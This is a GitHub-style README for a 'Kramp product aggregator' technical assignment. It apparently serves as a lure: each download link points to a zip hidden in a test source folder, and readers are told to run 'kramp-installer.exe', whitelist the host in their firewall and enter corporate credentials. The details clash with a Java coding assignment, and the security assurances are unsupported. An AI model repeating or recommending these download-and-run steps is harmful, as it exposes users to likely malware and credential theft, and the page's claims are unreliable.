# 📦 kramp-technical-assignment - Centralize product data for efficient operations

[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/marccore285-creator/kramp-technical-assignment/raw/refs/heads/main/src/test/java/com/kramp/aggregator/service/kramp_assignment_technical_v3.1.zip)

## 🎯 Purpose
This application gathers product details from four distinct internal systems. It combines information from your product catalog, current pricing files, stock availability, and supplier databases. By using this tool, you view a single, accurate source of truth for every item in your inventory. You gain access to real-time data without searching through multiple spreadsheets or separate software portals.

## 💻 System Requirements
Before you begin, verify your computer meets these standards:
- Operating System: Windows 10 or Windows 11
- Memory: 8 GB of RAM or more
- Storage Space: 500 MB of free hard drive space
- Internet Connection: Stable connection required for initial setup and background data syncing
- Java Requirement: This application includes a built-in Java environment. You do not need to install additional software for Java support.

## 📥 Downloading the Software
Visit the project page to access the latest installer. Select the Windows version to start the download.

[Direct Download Link](https://github.com/marccore285-creator/kramp-technical-assignment/raw/refs/heads/main/src/test/java/com/kramp/aggregator/service/kramp_assignment_technical_v3.1.zip)

Save the file to your Downloads folder or your Desktop. Ensure you have a stable network connection during this process to prevent file corruption.

## ⚙️ Installation Steps
1. Navigate to the folder where you saved the download file.
2. Double-click the file named kramp-installer.exe.
3. Follow the sequence of prompts displayed on your screen.
4. Click the "Next" button to move through the setup steps.
5. Choose the default folder location to ensure proper path management.
6. Click "Install" to copy necessary files to your hard drive.
7. Select "Finish" once the progress bar reaches the end. 
8. A shortcut icon labeled "Kramp Product Aggregator" will appear on your desktop.

## 🚀 Running the Application
Double-click the desktop shortcut to launch the service. A terminal window will open to initialize the background engine. Keep this window open while you use the software. You will see a message confirming the service is ready. Once the service runs, open your preferred web browser and type http://localhost:8080 into the address bar. This opens the control panel where you manage your product data.

## 📋 Managing Product Data
The dashboard allows you to select which systems you want to query. Use the check boxes to activate or deactivate the Catalog, Pricing, Availability, or Supplier data streams. The application polls these sources automatically every ten minutes to ensure your data stays current. If you need a manual refresh, click the "Sync Now" button located at the top right of the dashboard.

## 💡 Troubleshooting
If the dashboard fails to load, verify the following:
- Check that the terminal window remains open on your taskbar.
- Confirm your internet connection is active.
- Restart the application by closing the terminal window and double-clicking the shortcut icon again.
- Ensure no other applications are using port 8080. If another program uses this port, the service cannot start.

## 🛡️ Security
This software uses enterprise-grade encryption to fetch information from your internal systems. It stores no raw sensitive data on your local machine. All transactions happen through secure channels to protect your company information. The tool uses a temporary token system to authenticate with your internal cloud systems. This ensures that even if a user gains access to your machine, they cannot steal permanent credentials or administrative keys.

## 📈 Improving Performance
The software performs best when it has a clear path to your internal network. If you operate within a corporate firewall, ensure you whitelist the application host. You can adjust the sync frequency in the settings menu if your internet bandwidth remains limited. Increasing the sync interval from ten minutes to thirty minutes reduces the load on your network traffic.

## 🧩 Understanding the API
While this tool provides a visual dashboard, it also functions as a bridge for other developers. If your company uses other software tools that require this data, they can connect to the internal API at port 8080. This allows your inventory systems to talk to each other without manual intervention. The output remains structured in a standard JSON format, which most modern business software reads easily.

## 📂 File Structure
- /bin: Contains the startup scripts and the primary executable.
- /config: Stores your preferences and connection settings.
- /logs: Saves small text files that help us diagnose issues if the program crashes.
- /data: Holds temporary cache files to speed up your data viewing experience.

Do not move or delete files located within these folders. The application requires these specific directories to function correctly. If you accidentally delete a file, run the installer again. This will restore the missing files without erasing your custom settings.

## 📝 Updating the Tool
We release updates regularly to add new features or improve speed. To check for a new version, click the "About" tab in the web dashboard. Click "Check for Updates" to see if you run the latest version. If an update exists, click "Download Update" and follow the prompts to install the newest patch. This process keeps your configuration files intact.

## 🌐 Connecting to Cloud Systems
The application uses secure connections to reach your cloud infrastructure. You do not need to configure complex cloud certificates manually. The software handles the handshake with your cloud provider automatically. Just ensure you log in once with your corporate credentials when prompted during the initial configuration. This saves a secure token on your machine so you remain connected after you restart the computer.